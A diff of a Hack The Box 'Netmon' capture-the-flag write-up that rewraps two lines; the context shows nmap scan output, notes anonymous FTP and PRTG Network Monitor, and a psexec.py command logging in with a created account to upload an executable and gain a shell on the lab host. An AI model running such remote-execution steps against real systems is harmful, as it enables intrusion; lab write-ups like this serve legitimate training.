@@ -30,7 +30,8 @@ PORT STATE SERVICE VERSION
 135/tcp open msrpc Microsoft Windows RPC
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; 
+CPE: cpe:/o:microsoft:windows
 ```
 
 We can see that the box is likely running Windows Server 2008 R2 and that it allows anonymous FTP access to the entire main drive. The other thing to note is that there is a web server on port 80 which is running the application PRTG Network Monitor.
@@ -99,7 +100,8 @@ Once you have done this, you can login using Impacket's psexec.py
 ```bash
 ┌─[rin@parrot]─[~/boxes/Netmon/CVE-2018-9276]
 └──╼ $psexec.py rin:'password123!'@10.10.10.152
-Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation
+Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth 
+Corporation
 [*] Requesting shares on 10.10.10.152.....
 [*] Found writable share ADMIN$
 [*] Uploading file mirjPmkK.exe
